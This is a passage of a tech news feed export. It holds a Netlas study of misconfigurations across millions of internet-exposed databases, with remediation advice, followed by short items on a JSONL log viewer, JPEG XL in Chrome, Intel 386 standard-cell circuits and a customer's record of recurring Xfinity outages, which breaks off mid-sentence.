fail/pass rates to see which misconfigurations are actually happening at scale. The labels are just to provide contextual summaries, not security ratings.When I first started collecting raw Netlas data, I quickly realised that there was no way I could handle millions of JSON records by hand. I needed something that could stream through the data, normalise it, apply controls and then give out the results, all without me touching a single row.That’s how the idea of building a tool for this was born.At first, I wrote small test scripts like  to query a few hundred rows and see what the raw banners looked like. This was mostly for exploration, I wanted to see what JSON looked like for all the different databases and what fields I could use as evidence in my security controls.But as soon as I scaled up to tens of thousands of rows, I realised that I couldn’t just write one-off code for each database. I needed a proper pipeline, That’s when I split the project into three key parts:I built individual “control” scripts inside  folder, one for each database type. Each module contains:A list of security controls specific to that databaseAn evaluate() function that takes normalised record and returns PASS/FAIL/NA/UNKNOWN for each control, along with supporting evidence.
By keeping the logic separate, the system became modular, I could add or refine controls without touching the rest of the pipelineThe real brain of the project is . This script is responsible for:This meant that no matter what database type Netlas gave me, I could push it through a single standard workflow and get structured results back.Finally, all of this came together in the  script, the automation engine of the project. This is the script I ran for the 3.2 million dataset.Streams data directly from Netlas.Parses and normalises each record.Applies all database specific controls.Count failures and calculate scores.Writes everything to a CSV.Generates a compact JSON summary with aggregated stats.One of my goals wasn’t just to finish my research but to make the process reproducible and transparent. That is why I released the tool under the Netlas Github Organization as .git clone https://github.com/netlas-io/netlas-studiespip install -r requirements.txtFor using the tool, you will also need a Netlas account, Upon creating an account with Netlas you will find an API key in your profile which will be used to run the tool.Anyone with a Netlas API key can run a single command like this:And they will get exactly what I got:A CSV with every instance normalised and scored.A JSON summary with counts, distributions, and failure patterns.This makes the project useful for the wider community.Once the automation pipeline was in place, the real excitement began. I pointed my tool at Netlas with the “all databases” query and let it run. Over the course of a few hours, millions of database instances streamed in, each one normalised, tested, and scored automatically.What I got back wasn’t just a giant 20GB CSV, it was a snapshot of how exposed databases look on the internet right now.To keep the tour sane, I will start with the widest view (Who’s out there and how many), then go service by service, then down to specific controls, countries, providers, and time.1. Who’s out there: volume by database typeBefore talking about risk, let’s understand the composition. The dataset is not uniform: dominates with 78%, consisting 2,530,147 instances. and  make up the next big chunks with 279,854 and 267,871 instances respectively.MongoDB, Oracle, and Elasticsearch are smaller in count with the following numbers:: 2.73% with 88,565 instances.: 1.33% with 43,041 instances.: 1.11% with 36,142 instances.This matters, because when you later see the global risk figures, remember they’re weighted by who shows up the most.According to our simple risk assessment model, out of  internet-facing instances,  land in HIGH risk,  in MEDIUM,  in low and just  in CRITICAL, since our risk model had a condition where if more than 90% of the controls failed, it will be considered as CRITICAL, the critical percentage is low.So many High risk instances are due to problems like missing TLS, noisy banners, default ports, etc, all the small things add up to exploitable surface area at scale.But there are few things to keep in mind:. It usually means multiple basic controls failed (e.g., TLS off + version exposure + default port).Low doesn’t mean “Secure”. it means few controls failed in network visible evidence.High risk doesn’t always mean “hacked tomorrow”, but it does mean attackers see you as low-hanging fruit.Now let us have a look at the Fail count distribution.The distribution of failed controls shows a clear staircase:Low risk clusters at 1-2 failed checks.Medium concentrates at 3-4 fails.HIGH dominates at 5-6 fails.CRITICAL is a thin spike at 7 fails.Now Let’s see the Risk levels by serviceThe above chart dominates each database family to 100% so you can compare shape, A few clear patterns are:MongoDB & MSSQL skew heavily to HIGH. These two have the largest share of instances failing many basics at once. is mixed - not terrible, not great. A big chunk sits in LOW, but there is still a sizeable HIGH slice. spreads LOW to MEDIUM. clusters in Medium &  tilts MEDIUM/HIGH.These will make more sense once we look at the per control fails and pass rate.Up to this point, we have looked at the global picture of how the risk spreads across all databases. But each database type has its own story.
To really understand the problem, we need to go one layer deeper:What does exposure look like service by service?Which controls fail most often for each databases?And how do these failure actually translate into risk posture?Below, I break down each of the six databases one by one, using the same controls defined earlier and visualizing their failure pattern.Elasticsearch has long been a frequent source of exposure incidents because of its open by default behaviour. In this dataset, I identified 36,142 Elasticsearch instances directly exposed to the internet.As we can see from the above graph, over 58% of the instances passed most of the controls but the remaining  of the instances lie in the similar ranges.Now let us see the various controls analysis and figure out the top factors leading to this risk distribution, First let us look at the authentication Stats -Out of all the instances, around 21k (58%) passed authentication and over 15k (41.8%) failed authentication. This means anyone on the internet could directly query sensitive endpoints without needing credentials. Because the older versions shipped with authentication off by default and many admins never fixed it. This is one of the biggest contributors to “Critical Classification”.Another big contributor is the TLS Control -23,466 clusters did not use TLS, meaning all data exchanged between client and the cluster travels in plaintext. Since TLS requires extra setup and certificates, many organizations skip it, but when those same clusters are exposed to the internet, they become high risk targets.Here are some more stats for the other 4 controls:When we put these controls together, the risk posture makes more sense. The  cases are mostly clusters with no authentication, no TLS, and most of the other controls. The bulk of ‘High’ cases are clusters that failed a mix of version hiding, TLS and node controls, meanwhile, the Low category isn’t perfectly secure, it just means they only passed enough controls to avoid being in the other category.Let’s now look at MongoDB, another database with a history of misconfigurations.MongoDB has always been at the center of exposed database incidents. From ransom notes left on open clusters to massive credential leaks, it has a long history of misconfigurations. In this dataset, I identified  exposed to the internet.The overall risk distribution looks alarming: of MongoDB servers land in the High risk bucket.Only  are classified as Low.But Let us see the reason behind that and understand how each control leads up to this score.Let’s first start with Authentication, just as a heads up we didn’t have a clean way to directly test whether authentication was enabled or disabled. So instead we used a simple rule:If the server gave us any useful information without credentials (like version info, cluster metadata), we flagged it as fail.If it refused to answer until credentials were provided, it would have been a pass.With this method, every single MongoDB instance in our dataset got marked as a failure for authentication, As this rule is not the actual representation of the authentication mechanism, let’s not take that into consideration here.Let us see some other controls like Admin DB exposure. had their sensitive admin/test databases directly exposed. This means metadata and privileged functions were accessible without restriction. disclosed their exact MongoDB version. While version info alone isn’t always dangerous, paired with other failed controls can make it be.Similar to version, 76k+ clusters exposed full build information. These often leak unnecessary metadata and further reduce the effort needed for reconnaissance.So, In summary, when it comes to MongoDB, defining controls was harder compared to other databases. Many of the things we tested are tricky because of how MongoDB’s handshake works.That’s why in our dataset we ended up flagging a huge majority of instances as High, The important thing to note is that while the exact percentage may not perfectly reveal the truth, these patterns are still meaningful - exposed MongoDB servers tend to reveal more information than they should.Let’s move on to the next database, the largest one.MySQL is one of the oldest and most widely used databases in the world. From wordpress blogs to SaaS platforms, it shows up everywhere.In this dataset, I found over 2.53 million MySQL instances exposed to the internet, by far the largest among all database types.With 2.53M exposed instances, MySQL is the single biggest contributor to global exposure.Looking at the risk distribution: of exposed MySQL servers fall into High risk bucket. land in Medium risk. manage to stay in the Low risk category.The Critical category is almost nonexistent here.Let’s break it down control by control and see which failures are most common, and why they matter.Let’s start with Authentication again -MySQL supports password based authentication, but our evidence showed that  failed this control. This doesn’t always mean no password at all, but that all exposed metadata suggested weak or missing authentication.Now let us have a look at TLS enforcement.In this case the results were more positive, around 1.53M servers passed TLS checks, meaning they advertised support for encrypted transport. Only ~3.3k instances failed. However Around 1.7M came back as “NA” where the scan didn’t reveal a clear answer.This one is especially worrying. About  servers had LOCAL INFILE enabled, and around  returned NA, this allows attackers to trick the server into reading files from disk or loading remote data.Here are the stats of other controls excluding the NA’s -Overall, MySQL’s results weren’t too bad, but its still concerning. Many servers do have TLS enabled, which is a good sign. However, this is outweighed by version disclosures, use of default ports, LOCAL INFILE feature, etc. That is why nearly half of the MySQL instances ended up classified as High risk in our model.Now let’s move on to the next database type which is MSSQL.MSSQL is widely used in enterprise environments. Because of its adoption in critical industries, exposed Servers can be really dangerous, attackers can pivot from these databases into entire enterprise networks.In our dataset, I identified  directly exposed.The Risk distribution shows that the majority of exposed MSSQL servers fall into High Risk, Let’s break down the controls to understand why -Unfortunately, almost all MSSQL servers failed the authentication test. This suggests that they provided some kind of banner or protocol response without requiring credentials. While this doesn’t necessarily mean anyone can query the database, it does show that these servers expose too much information.Roughly  did not enforce encryption.Certificate Validity & TrustMost of the certificates we observed were either expired, self-signed, or not trusted by standard CAs. 260k instances failed the certificate validity check.A large portion of servers still accepted older TDS protocol versions. Outdated protocol support can carry legacy vulnerabilities.So in summary, Almost all instances leaked version banners, sat on default port, while a majority had invalid or untrusted certificates combined with weak encryption and authentication, this is why most of the MSSQL instances landed heavily in the High Risk category.Now let’s move on to PostgreSQL.PostgreSQL is widely preferred for its reliability and advanced features. its used for web apps, analytics, and large scale platforms.
In this dataset, I identified 267,871 PostgreSQL instances.The overall distribution shows that majority of the instances fall in the Medium risk category with a decent amount of instances in the High category as well. Let’s walk through each control in detail -Almost all the instances required authentication in some form, only 506 instances failed this control. That’s actually encouraging compared to the other services.Unfortunately, every single PostgreSQL instance failed this control, this is one of the largest contributor in the High risk bucket.Postgres supports different protocol versions, and insecure ones should be disabled.  failed this test and about 145k passed.And the other controls such as Default port usage, Error verbosity and version disclosure consisted of majorly failures. Combining that with the TLS enforcement and protocol restriction explains the risk distribution.Let’s move on to the next and the last one - Oracle.Oracle databases are not as frequently exposed to the public internet compared to others, but when they are, they usually belong to large enterprises, governments, or critical services which makes any exposure highly concerningThe risk distribution looks very different from the other databases: land in Medium risk.No significant share fell into the Critical bucket.Let’s breakdown each control one by one.Around 36k servers passed authentication by refusing connection, but , although most of the instances passed, even this ~15% failure rate is worrying. instances disclosed their exact Oracle version. hid this information.Listener Services Exposure: instances leaked listener service version details.This weakens security because attackers can map running services without authentication.And other controls like Default Port, Error verbosity, Encryption enforcement came out to be majorly fails.So, in summary, the risk patterns show that admins are at least enabling authentication, but failing at other small controls like leaking version, verbose errors, and skipping encryption. This is why most servers cluster in the Medium risk bucket.Percentages are approximate, based on what banners and metadata revealed. They should be read as trends, not exact counts.Risk Distribution Approx (Critical / High / Medium / Low)6.3% / 16.9% / 18.6% / 58.1%Authentication, TLS, Cluster State Access, Version Disclosure4.4% / 81.6% / 0.5% / 13.4%Authentication (method issue), Version Disclosure, Build Info, Admin DB0% / 48.7% / 14.4% / 36.9%Auth Enforcement, Local Infile, Default Ports, Host Restrictions~1% / 81.65% / 7.61% / ~0%Auth Enforcement, Certificate Trust/Validity, Version Disclosure, Protocol Version~0% / 39.28% / 60.14% / ~0%TLS Enforcement, Error Verbosity, Version Disclosure, Default Port~0% / 14.8% / 69.8% / 15.5%Version Disclosure, Error Verbosity, Encryption Enforcement, Default PortOnce we broke down the risk posture of each database service individually, the next step was to zoom out again and see what patterns hold true across the whole dataset.
Looking beyond individual technologies, certain themes emerged around hosting providers, geography, etc.I started by mapping exposures across continents. Unsurprisingly, North America and Asia dominated in sheer numbers, followed by Europe.But raw volume isn’t the whole story. When we normalised by risk level:Europe showed a higher percentage of Medium risk instances.Asia had a mix of High and Critical exposures.North America showed the widest spread.Internet Service Providers (ISPs)When grouped by ISP’s, these were the Top 20 ISPs by Record Count -And at last, this is the final short summary of all the 3M records -So far, we have seen how exposed databases manifest across services, providers and geographies. But How do we fix this?Here are the key takeaways for each database type: - Never allow anonymous queries. Whether it’s MongoDB, Elasticsearch, or MySQL, enabling auth is the first line of defence. - Plaintext protocols are still too common. TLS ensures data can’t be intercepted or tampered with.Reduce Information Leakage - Suppress verbose banners, build info, and error messages that give attackers reconnaissance data for free.Keep Versions Up to Date - Outdated versions often come with known exploits. Patching remains the single most effective control.Service Specific GuidanceRequire authentication before exposing any API.Block or secure _cluster/state and other sensitive end points.Harden node role disclosure and prevent internal IP leakage.Never expose admin databases without credentials.Disable build info exposure unless required.Disable  unless absolutely needed.Enforce strong authentication mechanisms.Ensure TLS is configured.Require encrypted connections.Use trusted, valid certificates.Disable older protocol versions of TDS.Require TLS for all connections.Restrict protocol support to latest, secure versions.Lock down listener services and restrict who can query them.Enforce proper encryption.Suppress error responses and version disclosures.Configuration is only one piece of the puzzle. Long term fixes require:. Detect exposed endpoints quickly.. Never mix critical databases with internet facing applications in the same network tier.. Building awareness among developers and admins is crucial.When I first set out on this research, the question was simple: are exposed databases still a major problem in 2025, or are we mostly past it?Using Netlas data, I analysed over 3.2 million exposed instances across six of the most widely used databases andOver half of the systems landed in the High risk category.Some controls were straightforward to measure and others were harder to pin down clearly.Misconfigurations were rarely exotic, they were the same familiar issues: missing authentication, no TLS, verbose error messages, default ports.This tells us something important: the issue is , but a lack of consistent practice. Organisations already know these basics, yet they remain undone at scale.However, this research also shows that progress is possible. Many instances did pass certain controls, like TLS adoption is growing, authentication is often enforced on newer deployments. These are good signs.Why This Study Was ChallengingPerforming this kind of test has limitations:We only see what banners, errors, and metadata give away.We did not attempt any active exploitation or deep probing.Some controls can behave differently in real-world deployments than they appear in the banner.That’s why I always frame this study as evidence of patterns, not a definitive count. It’s a lens, not an x-ray.This study never attempted exploitation. All findings are passive observations and real-world risk could be higher or lower than indicated.At its core, this research shows that the internet still suffers from old mistakes in new times. None of the controls we tested were advanced, they were the basics, and yet, across many systems, those basics are still broken.The lesson is not that databases are unsafe, but that operational discipline is inconsistent.Even small mistakes add up, and when multiplied by millions, they become a global security problem.Chat with our team to explore how the Netlas platform can support your security research and threat analysis.]]></content:encoded></item><item><title>Week in review: Stealth-patched FortiWeb vulnerability under active exploitation, Logitech data breach</title><link>https://www.helpnetsecurity.com/2025/11/23/week-in-review-stealth-patched-fortiweb-vulnerability-under-active-exploitation-logitech-data-breach/</link><author></author><category>security</category><pubDate>Sun, 23 Nov 2025 09:00:47 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[
            Here’s an overview of some of last week’s most interesting news, articles, interviews and videos:
The tech that turns supply chains from brittle to unbreakable
In this Help Net Security interview, Sev ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>After my dad died, we found the love letters</title><link>https://www.jenn.site/after-my-dad-died-we-found-the-love-letters/</link><author>eatitraw</author><category>dev</category><pubDate>Sun, 23 Nov 2025 08:40:41 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>[Tool] Native JSONL viewer for analyzing massive security logs (Suricata, Zeek, EDR) without infrastructure overhead</title><link>https://iotdata.systems/jsonlviewerpro/</link><author>/u/hilti</author><category>netsec</category><pubDate>Sun, 23 Nov 2025 06:47:31 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Multi-threaded parsing with simdjson. Built with C++ for native speed, not Electron bloatware. Opens 5GB files in seconds.Automatically expands nested objects into columns: alert.signature, flow.bytes_toserver, user.profile.email. Filter on any nested field.Text search across all columns. Numeric operators: >100, <=50, !=0. Perfect for filtering by severity, byte counts, or timestamps.Supports .jsonl and .jsonl.gz (gzip compressed). Export filtered results. Quick stats showing min/max/avg values.Freeze important columns, hide/show any field, auto-sizing. Perfect for working with wide security log schemas.Native Mac app. No internet required. Your data never leaves your machine. Small 6MB footprint. Zero telemetry.]]></content:encoded></item><item><title>Google Revisits JPEG XL in Chromium After Earlier Removal</title><link>https://windowsreport.com/google-revisits-jpeg-xl-in-chromium-after-earlier-removal/</link><author>eln1</author><category>dev</category><pubDate>Sun, 23 Nov 2025 06:05:51 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[INSTALL BY CLICKING THE DOWNLOAD
    FILEFix Windows 11 OS errors with Fortect:
                    Download Fortect and install it on your PC
                
                    Launch the tool and  to find broken files that are causing the problems
                
                    Right-click on  to fix issues affecting your computer’s security and performance
                Three years ago, Google removed JPEG XL support from Chrome, stating there wasn’t enough interest at the time. That position has now changed.In a recent note to developers, a Chrome team representative confirmed that work has restarted to bring JPEG XL to Chromium and said Google “would ship it in Chrome” once long-term maintenance and the usual launch requirements are met.The team explained that other platforms moved ahead. Safari supports JPEG XL, and Windows 11 users can add native support through an image extension from Microsoft Store. The format is also confirmed for use in PDF documents. There has been continuous demand from developers and users who ask for its return.Before Google ships the feature in Chrome, the company wants the integration to be secure and supported over time.Chrome JPEG XL implementation adds animation supportA developer has submitted new code that reintroduces JPEG XL to Chromium. This version is marked as feature complete. The developer said it also “includes animation support,” which earlier implementations did not offer. The code passes most of Chrome’s automated testing, but it remains under review and is not available to users.The featured image is taken from an unlisted developer demo created for testing purposes.JPEG XL is a newer image format intended as a replacement for traditional JPEG files. It can reduce file size without loss in visual quality. This may help web pages load faster and reduce data usage.  More details are available on the official JPEG XL website.Google has not provided a timeline for JPEG XL support in Chrome. Users cannot enable the format today, but development has restarted after years without progress.]]></content:encoded></item><item><title>Unusual circuits in the Intel 386&apos;s standard cell logic</title><link>https://www.righto.com/2025/11/unusual-386-standard-cell-circuits.html</link><author>Stratoscope</author><category>dev</category><pubDate>Sun, 23 Nov 2025 03:33:42 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[I've been studying the standard cell circuitry in the Intel 386 processor recently.
The 386, introduced in 1985, was Intel's most complex processor at the time, containing 285,000 transistors.
Intel's existing design techniques couldn't handle this complexity and the chip began to fall behind schedule.
To meet the schedule, the 386 team started using a technique called standard cell logic.
Instead of laying out each transistor manually, the layout process was performed by a computer.The idea behind standard cell logic is to create standardized circuits (standard cells) for each type of logic element, such
as an inverter, NAND gate, or latch.
You feed your circuit description into software that selects the necessary cells, 
positions these cells into columns, and then routes the wiring between the cells.
This "automatic place and route" process creates the chip layout much faster than manual layout.
However, switching to standard cells was a risky decision since if the software couldn't create a
dense enough layout, the chip couldn't be manufactured.
But in the end, the 386 finished ahead of schedule, an almost unheard-of accomplishment.The 386's standard cell circuitry contains a few circuits that I didn't expect.
In this blog post, I'll take a quick look at some of these circuits:
surprisingly large multiplexers, a transistor that doesn't fit into the standard cell layout,
and inverters that turned out not to be inverters.
(If you want more background on standard cells in the 386, see my earlier post,
"Reverse engineering standard cell logic in the Intel 386 processor".)The photo below shows the 386 die with the automatic-place-and-route regions highlighted; I'm focusing
on the red region in the lower right.
These blocks of logic have cells arranged in rows, giving them a characteristic striped appearance.
The dark stripes are the transistors that make up the logic gates, while the lighter regions between the stripes are the
"routing channels" that hold the wiring that connects the cells.
In comparison,
functional blocks
such as the datapath on the left
and the microcode ROM in the lower right
were designed manually to optimize density and performance, giving them a more solid appearance.The 386 die with the standard-cell regions highlighted.As for other features on the chip,
the black circles around the border are bond wire connections that go to the chip's external pins.
The chip has two metal layers, a small number by modern
standards, but a jump from the single metal layer of earlier processors such as the 286.
(Providing two layers of metal made automated routing practical: one layer can hold horizontal wires while the other layer
can hold vertical wires.)
The metal appears white in larger areas, but
purplish where circuitry underneath roughens its surface.
The underlying silicon and the polysilicon wiring are obscured by the metal layers.The standard cell circuitry that I'm examining (red box above) is part of the control logic that selects registers
while executing an instruction.
You might think that it is easy to select which registers take part in an instruction, but
due to the complexity of the x86 architecture, it is more difficult.
One problem is that a 32-bit register such as EAX can also be treated as the 16-bit register AX,
or two 8-bit registers AH and AL.
A second problem is that some instructions include a "direction" bit that switches the source and
destination registers.
Moreover, sometimes the register is specified by bits in the instruction, but in other cases,
the register is specified by the microcode.
Due to these factors, selecting the registers for an operation is a complicated process with many
cases, using control bits from the instruction, from the microcode, and from other sources.Three registers need to be selected for an operation—two source registers and a destination register—and there
are about 17 cases that need to be handled.
Registers are specified with 7-bit control signals that select one of the 30 registers and control
which part of the register is accessed.
With three control signals, each 7 bits wide, and about 17 cases for each, you can see that
the register control logic is large and complicated.
(I wrote more about the 386's registers here.)I'm still reverse engineering the register control logic, so I won't go into details.
Instead, I'll discuss how the register control circuit uses multiplexers, implemented with standard cells.
A multiplexer is a circuit that combines multiple
input signals into a single output by selecting one of the inputs.
A multiplexer can be implemented with logic gates, for instance, by ANDing each input with the
corresponding control line, and then ORing the results together.
However, the 386 uses a different approach—CMOS switches—that avoids a large AND/OR gate.Schematic of a CMOS switch.The schematic above shows how a CMOS switch is constructed from two MOS transistors.
When the two transistors are on, the output is connected to the input, but when the two transistors are
off, the output is isolated.
An NMOS transistor is turned on when its input is high, but a PMOS transistor is turned on when its
input is . Thus, the switch uses two control inputs, one inverted.
The motivation for using two transistors is that an NMOS transistor is better at pulling the output
low, while a PMOS transistor is better at pulling the output high, so combining them yields the best performance.
Unlike a logic gate, the CMOS switch has no amplification, so a signal is weakened as it passes through the switch.
As will be seen below, inverters can be used to amplify the signal.The image below shows how CMOS switches appear under the microscope.
This image is very hard to interpret because the two layers of metal on the 386 are packed together densely, but you
can see that some wires run horizontally and others run vertically.
The bottom layer of metal (called M1) runs vertically in the routing area, as well as providing internal
wiring for a cell.
The top layer of metal (M2) runs horizontally; unlike M1, the M2 wires can cross a cell.
The large circles are vias that connect the M1 and M2 layers, while the small circles are connections
between M1 and polysilicon or M1 and silicon.
The central third of the image is a column of standard cells with two CMOS switches outlined in green.
The cells are bordered by the vertical ground rail and
+5V rail that power the cells. 
The routing areas are on either side of the cells, holding the wiring that connects the cells.Two CMOS switches, highlighted in green. The lower switch is flipped vertically compared to the upper switch.Removing the metal layers reveals the underlying silicon with a layer of polysilicon wiring on top.
The doped silicon regions show up as dark outlines.
I've drawn the polysilicon in green; it forms a transistor (brighter green) when it crosses doped silicon.
The metal ground and power lines are shown in blue and red, respectively, with other metal wiring in purple.
The black dots are vias between layers.
Note how metal wiring (purple) and polysilicon wiring (green) are combined to route signals within
the cell.
Although this standard cell is complicated, the important thing is that it only needs to be designed once.
The standard cells for different functions are all designed to have the same width, so the cells can be arranged in
columns, snapped together like Lego bricks.A diagram showing the silicon for a standard-cell switch. The polysilicon is shown in green. The bottom metal is shown in blue, red, and purple.To summarize, this switch circuit allows the input to be connected to the output or disconnected, controlled by the select signal.
This switch is more complicated than the earlier schematic because it includes two inverters to amplify
the signal.
The data input and the two select lines are connected to the polysilicon (green); the cell is designed so
these connections can be made on either side.
At the top, the input goes through a standard two-transistor inverter.
The lower left has two transistors, combining the NMOS half of an inverter with the NMOS half of the switch.
A similar circuit on the right combines the PMOS part of an inverter and switch.
However, because PMOS transistors are weaker, this part of the circuit is duplicated.A multiplexer is constructed by combining multiple switches, one for each input.
Turning on one switch will select the corresponding input.
For instance, a four-to-one multiplexer has four switches, so it can select one of the four inputs.A four-way multiplexer constructed from CMOS switches and individual transistors.The schematic above shows a hypothetical multiplexer with four inputs.
One optimization is that if an input is always 0, the PMOS transistor can be omitted. Likewise,
if an input is always 1, the NMOS transistor can be omitted.
One set of select lines is activated at a time to select the corresponding input.
The pink circuit selects 1,
green selects input A, yellow selects input B, and blue selects 0.
The multiplexers in the 386 are similar, but have more inputs.The diagram below shows how much circuitry is devoted to multiplexers in this block of standard cells.
The green, purple, and red cells correspond to the multiplexers driving the three register control
outputs.
The yellow cells are inverters that generate the inverted control signals for the CMOS switches.
This diagram also shows how the automatic layout of cells results in a layout that appears random.A block of standard-cell logic with multiplexers highlighted. The metal and polysilicon layers were removed for this photo, revealing the silicon transistors.The idea of standard-cell logic is that standardized cells are arranged in columns.
The space between the cells is the "routing channel", holding the wiring that links the cells.
The 386 circuitry follows this layout, except for one single transistor, sitting between two columns
of cells.The "misplaced" transistor, indicated by the arrow. The irregular green regions are oxide that was incompletely removed.I wrote some software tools to help me analyze the standard cells. Unfortunately, my tools
assumed that all the cells were in columns, so this one wayward transistor caused me considerable inconvenience.The transistor turns out to be a PMOS transistor, pulling a signal high as part of a multiplexer.
But why is this transistor out of place?
My hypothesis is that the transistor is a bug fix.
Regenerating the cell layout was very costly, taking many hours on an IBM mainframe computer.
Presumably, someone found that they could just stick the necessary transistor into an unused spot in the
routing channel, manually add the necessary wiring, and avoid the delay of regenerating all the cells.The simplest CMOS gate is the inverter, with an NMOS transistor to pull the output low and a
PMOS transistor to pull the output high.
The standard cell circuitry that I examined contains over a hundred inverters of various
sizes.
(Performance is improved by using inverters that aren't too small but also aren't
larger than necessary for a particular circuit. Thus, the standard cell library includes inverters of multiple sizes.)The image below shows a medium-sized standard-cell inverter under the microscope.
For this image, I removed the two metal layers with acid to show the underlying polysilicon
(bright green) and silicon (gray).
The quality of this image is
poor—it is difficult to remove the metal without destroying the polysilicon—but the diagram below
should clarify the circuit.
The inverter has two transistors: a PMOS transistor connected to +5 volts to pull the output high when
the input is 0, and an NMOS transistor connected to ground to pull the output low when the input is 1.
(The PMOS transistor needs to be larger because PMOS transistors don't function as well as NMOS transistors due to
silicon physics.)An inverter as seen on the die. The corresponding standard cell is shown below.The polysilicon input line plays a key role: where it crosses the doped silicon, a transistor gate is
formed.
To make the standard cell more flexible, the input to the inverter
can be connected on either the left or the right; in this case, the input
is connected on the right and there is no connection on the left.
The inverter's output can be taken from the polysilicon on the upper left or the right, but in this case, it
is taken from the upper metal layer (not shown).
The power, ground, and output lines are in the lower metal layer, which I have represented by
the thin red, blue, and yellow lines. The black circles are connections between the metal layer and
the underlying silicon.This inverter appears dozens of times in the circuitry.
However, I came across a few inverters that didn't make sense. The problem was
that the inverter's output was connected to the output of a multiplexer.
Since an inverter is either on or off, its value would clobber the output of the multiplexer.
This didn't make any sense.
I double- and triple-checked the wiring to make sure I hadn't messed up.
After more investigation, I found another problem: the input to a "bad" inverter didn't make sense
either. The input consisted of two signals shorted together, which doesn't work.Finally, I realized what was going on. A "bad inverter" has the exact silicon layout of an inverter,
but it wasn't an inverter: it was independent NMOS and PMOS transistors with separate inputs.
Now it all made sense.
With two inputs, the input signals were independent, not shorted together.
And since the transistors were controlled separately, the NMOS transistor could pull the output
low in some circumstances, the PMOS transistor could pull the output high in other circumstances,
or both transistors could be off, allowing the multiplexer's output to be used undisturbed.
In other words, the "inverter" was just two more cases for the multiplexer.The "bad" inverter. (Image is flipped vertically for comparison with the previous inverter.)If you compare the "bad inverter" cell below with the previous cell, they look  the same, but
there are subtle differences.
First, the gates of the two transistors are connected in the real inverter, but disconnected
by a small gap in the transistor pair.
I've indicated this gap in the photo above; it is hard to tell if the gap is real or just an imaging
artifact, so I didn't spot it.
The second difference is that the "fake" inverter has two input connections, one to each transistor,
while the inverter has a single input connection.
Unfortunately, I assumed that the two connections were just a trick to route the signal across
the inverter without requiring an extra wire.
In total, this cell was used 32 times as a real inverter and 9 times
as independent transistors.Standard cell logic and automatic place and route have a long history before the 386,
back to the early 1970s, so this isn't an Intel invention.
Nonetheless, the 386 team deserves the credit for deciding to use this technology at a time when it
was a risky decision.
They needed to develop custom software for their placing and routing needs, so this wasn't a trivial undertaking.
This choice paid off and they completed the 386 ahead of schedule.
The 386 ended up being a huge success for Intel, moving the x86 architecture to 32 bits and defining the dominant computer
architecture for the rest of the 20th century.If you're interested in standard cell logic, I also wrote about standard cell logic in an IBM chip.
I plan to write more about the 386, so 
follow me on
Mastodon, Bluesky,
or RSS for updates.
Thanks to Pat Gelsinger and Roxanne Koester for providing helpful papers.]]></content:encoded></item><item><title>Hitchhiker&apos;s Guide to Attack Surface Management</title><link>https://devansh.bearblog.dev/attack-surface-management/</link><author>/u/alt69785</author><category>netsec</category><pubDate>Sun, 23 Nov 2025 03:12:55 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>GCC SC approves inclusion of Algol 68 Front End</title><link>https://gcc.gnu.org/pipermail/gcc/2025-November/247020.html</link><author>edelsohn</author><category>dev</category><pubDate>Sun, 23 Nov 2025 02:18:03 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Meta buried &apos;causal&apos; evidence of social media harm, US court filings allege</title><link>https://www.reuters.com/sustainability/boards-policy-regulation/meta-buried-causal-evidence-social-media-harm-us-court-filings-allege-2025-11-23/</link><author>pseudolus</author><category>dev</category><pubDate>Sun, 23 Nov 2025 01:09:47 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>A monopoly ISP refuses to fix upstream infrastructure</title><link>https://sacbear.com/xfinity-wont-fix-internet/</link><author>vedmed</author><category>dev</category><pubDate>Sun, 23 Nov 2025 00:46:53 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[A documented case of infrastructure failure, failed escalation, and a company that refuses to investigate.Here’s the situation: I have outages. My neighbor has the same outages. Xfinity won’t fix it.I bought Xfinity internet in June 2024. Immediately, my connection started dropping. Multiple times a day. Every single day. After troubleshooting every piece of equipment I had and questioning my sanity my neighbor complained about the same thing which led me to understand this was not my equipment.I set up an uptime monitor and found that these outages happen 6-7 times per day for 125 seconds.Over 17 months of my service term that’s approximately 3,387 outage incidents totaling 117+ hours of cumulative downtime.This outage pattern has recurred thousands of times. It is consistent, predictable, and it follows an automated schedule.My neighbor has the same problem. Different house. Different line from a different junction box. Same 125-second outages happening at the same times of day.I called support. Multiple times. They blamed my WiFi (I’m hardwired). They blamed my modem (an Xfinity Approved MB8611 that worked without fault on Wave Broadband and Spectrum). They blamed my router (I tested with multiple devices). They sent a subcontracted technician. Then another subcontracted technician. Then a subcontracted crew. The crew ran a new coax line and grounded it to a water pipe that turns into PVC when it enters the ground (this doesn’t ground anything). Then they sent an Xfinity technician to look at the line.The problem never changed. The only thing that changed is my download speed dropped from advertised 1200Mbps to <500Mbps.I escalated to retention. They offered me nothing. I provided detailed technical documentation showing the exact pattern of the outages, the minute markers they occur at, the exact duration every single time. They didn’t understand it. They couldn’t escalate it.I was transferred to technical support. The person did not care and put me on speaker phone with so much background noise I couldn’t hear myself think. I imagine he was rolling his eyes while trying his utmost to care less.My Neighbor’s Attempts to Fix ItHe called Xfinity about his TV cutting out repeatedly. The technician told him his UPS grounding his coax cable was causing the problem. So he ungrounded the cable, pocketed the spare cable, and my neighbor kept having the same issues.Just in the last 72 hours I have documented 20 consecutive outages using OPNSense’s built in gateway uptime monitor. Here’s what they show:Every single outage lasted 124.8 ± 1.3 seconds. That’s not random hardware failure. That’s a timeout value hardcoded into something in Xfinity’s infrastructure.The outages cluster at specific minute markers. 35% start at minute :44. 35% start at minute :29. This is scheduled automation. This is likely a cron job or automated task running at those exact times every hour.The outages peak at specific hours. Most happen between noon and 1 